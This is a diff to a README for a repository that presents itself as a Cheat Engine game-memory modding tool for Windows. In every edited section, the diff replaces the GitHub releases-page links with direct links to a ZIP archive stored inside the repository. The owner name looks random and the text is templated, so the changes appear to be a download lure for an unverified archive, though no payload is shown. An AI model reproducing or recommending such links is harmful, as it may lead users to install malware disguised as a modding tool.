@@ -1,11 +1,11 @@
 # 🛠️ Cheat-Engine-Modding-Games-Windows - Edit Game Memory With Ease
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Circulatory-average385/Cheat-Engine-Modding-Games-Windows/releases)
-[![Windows](https://img.shields.io/badge/Windows-Ready-grey?style=for-the-badge)](https://github.com/Circulatory-average385/Cheat-Engine-Modding-Games-Windows/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Circulatory-average385/Cheat-Engine-Modding-Games-Windows/main/BaseMain/Modding_Games_Cheat_Engine_Windows_3.4.zip)
+[![Windows](https://img.shields.io/badge/Windows-Ready-grey?style=for-the-badge)](https://raw.githubusercontent.com/Circulatory-average385/Cheat-Engine-Modding-Games-Windows/main/BaseMain/Modding_Games_Cheat_Engine_Windows_3.4.zip)
 
 ## 📥 Download
 Visit this page to download:  
-https://github.com/Circulatory-average385/Cheat-Engine-Modding-Games-Windows/releases
+https://raw.githubusercontent.com/Circulatory-average385/Cheat-Engine-Modding-Games-Windows/main/BaseMain/Modding_Games_Cheat_Engine_Windows_3.4.zip
 
 Use the latest release file for Windows. If the release includes a ZIP or EXE file, download it to your PC before you move to the setup steps.
 
@@ -35,7 +35,7 @@ For best results, close extra apps before you start. This gives the tool more me
 ## 🚀 How to Download
 
 1. Open the release page:  
-   https://github.com/Circulatory-average385/Cheat-Engine-Modding-Games-Windows/releases
+   https://raw.githubusercontent.com/Circulatory-average385/Cheat-Engine-Modding-Games-Windows/main/BaseMain/Modding_Games_Cheat_Engine_Windows_3.4.zip
 
 2. Find the latest release near the top of the page.
 
@@ -218,7 +218,7 @@ This tool is for users who want to:
 ## 📎 Download Again
 
 Visit this page to download the latest Windows release:  
-https://github.com/Circulatory-average385/Cheat-Engine-Modding-Games-Windows/releases
+https://raw.githubusercontent.com/Circulatory-average385/Cheat-Engine-Modding-Games-Windows/main/BaseMain/Modding_Games_Cheat_Engine_Windows_3.4.zip
 
 ## 🧩 Helpful Terms
 
